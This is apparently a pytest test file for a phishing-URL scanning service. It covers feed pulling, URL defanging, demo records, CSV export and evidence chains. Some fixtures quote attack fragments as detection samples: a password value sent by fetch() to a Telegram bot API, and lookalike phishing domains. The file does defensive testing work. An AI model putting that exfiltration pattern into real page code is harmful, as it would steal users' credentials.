def test_pull_limit_counts_only_new_urls():
    service = make_service()
    first = pull_threatradar(TR_DIR, service, limit=2)
    assert first.queued.accepted == 2 and first.over_limit > 0
    second = pull_threatradar(TR_DIR, service, limit=2)
    assert second.queued.accepted == 2  # moves forward instead of stalling
    assert {*first.queued.job_ids}.isdisjoint(second.queued.job_ids)


def test_pull_missing_folder_is_an_error(tmp_path):
    with pytest.raises(FileNotFoundError):
        pull_threatradar(tmp_path / "nope", make_service())


# ---- defanging ------------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("url", "expected"),
    [
        ("https://example.com/", "hxxps://example[.]com/"),
        ("http://a.b.example.org/p.php?x=1.2#f", "hxxp://a[.]b[.]example[.]org/p.php?x=1.2#f"),
        ("https://1.2.3.4:8080/x", "hxxps://1[.]2[.]3[.]4:8080/x"),
        ("HTTPS://Shop.Example?q=a.b", "hxxps://Shop[.]Example?q=a.b"),
        ("hxxps://a[.]com/", "hxxps://a[.]com/"),  # idempotent
    ],
)
def test_defang_url(url, expected):
    assert defang_url(url) == expected
    assert defang_url(expected) == expected


def test_defang_text_keeps_identifiers():
    text = (
        "Sends the password to api.telegram.org via https://x.y.com/p "
        "(rules behavior.clickfix, dom.password_form_external_action; config.yaml; v0.3)"
    )
    out = defang_text(text)
    assert "api[.]telegram[.]org" in out and "hxxps://x[.]y[.]com/p" in out
    for kept in ("behavior.clickfix", "dom.password_form_external_action", "config.yaml", "v0.3"):
        assert kept in out
    assert defang_text(out) == out
    assert defang_host("a.b.com") == "a[.]b[.]com" and defang_host(None) is None


def test_defang_analysis_walks_only_text_fields():
    response = phishing("https://paypa1.com/x").model_dump(mode="json")
    response["input"]["redirect_hosts"] = ["t.co", "paypa1.com"]
    response["warnings"] = ["see paypa1.com"]
    safe = defang_analysis(response)
    assert safe["input"]["redirect_hosts"] == ["t[.]co", "paypa1[.]com"]
    assert safe["warnings"] == ["see paypa1[.]com"]
    assert safe["analysis_id"] == response["analysis_id"]
    assert response["input"]["submitted_url"] == "https://paypa1.com/x"  # input not mutated


# ---- demo + scripts -------------------------------------------------------------------------


def test_demo_rows_are_marked_and_removable():
    service = make_service()
    service.record_finished(
        "https://demo-scam.com/",
        phishing("https://demo-scam.com/"),
        "threatradar_push",
        source_ref={"demo": True},
        demo=True,
    )
    rows = service.store.list_scans()
    assert rows[0]["demo"] == 1
    # demo results never stand in for a real check of the same URL
    real = service.enqueue([UrlItem("https://demo-scam.com/")], "threatradar_push")
    assert real.accepted == 1 and real.duplicates == 0
    assert service.store.delete_demo() == 1
    assert service.store.job(real.job_ids[0]) is not None  # real job kept


def test_threatradar_doc_and_scripts_exist():
    root = project_root()
    doc = (root / "docs" / "threatradar_integration.md").read_text(encoding="utf-8")
    for needle in ("X-C2-Ingest-Key", "C2_INGEST_URL", "C2_INGEST_KEY", "202", "fetch("):
        assert needle in doc
    for script in ("pull_threatradar.py", "review_live.py", "demo_ingest.py"):
        assert (root / "scripts" / script).is_file()


def test_written_csv_is_utf8_without_bom(tmp_path):
    service = make_service()
    job = finish(service, "https://ශ්‍රී-bank.com/", phishing("https://xn--bank.com/"))
    service.store.decide_review(job, "confirmed", "phishing", "Dilshan")
    out = tmp_path / "x.csv"
    export_confirmed(service.store, out)
    raw = out.read_bytes()
    assert not raw.startswith(b"\xef\xbb\xbf")
    rows = list(csv.DictReader(raw.decode("utf-8").splitlines()))
    assert rows[0]["url"] == "https://ශ්‍රී-bank.com/"


def test_behavior_evidence_chain_is_kept_and_defanged():
    finding = AnalysisFinding(
        id="behavior.credential_exfiltration.external",
        modality="behavior",
        severity="critical",
        title="Credential exfiltration",
        detail="d",
        steps=[
            {"kind": "source", "line": 3, "code": "var p = pass.value", "note": "pwd"},
            {"kind": "sink", "line": 9, "code": "fetch('https://api.telegram.org/bot1')"},
        ],
    )
    response = make_response("https://x-bank.com/", "Malicious", 95, "phishing", findings=[finding])
    assert AnalysisResponse.model_validate_json(response.model_dump_json()) == response
    safe = defang_analysis(response.model_dump(mode="json"))
    steps = safe["findings"][0]["steps"]
    assert [s["kind"] for s in steps] == ["source", "sink"]
    assert steps[1]["code"] == "fetch('hxxps://api[.]telegram[.]org/bot1')"
    assert (
        make_response("u").findings == []
        and AnalysisFinding(id="x", modality="dom", severity="low", title="t", detail="d").steps
        == []
    )  # optional: other findings and old clients are unaffected
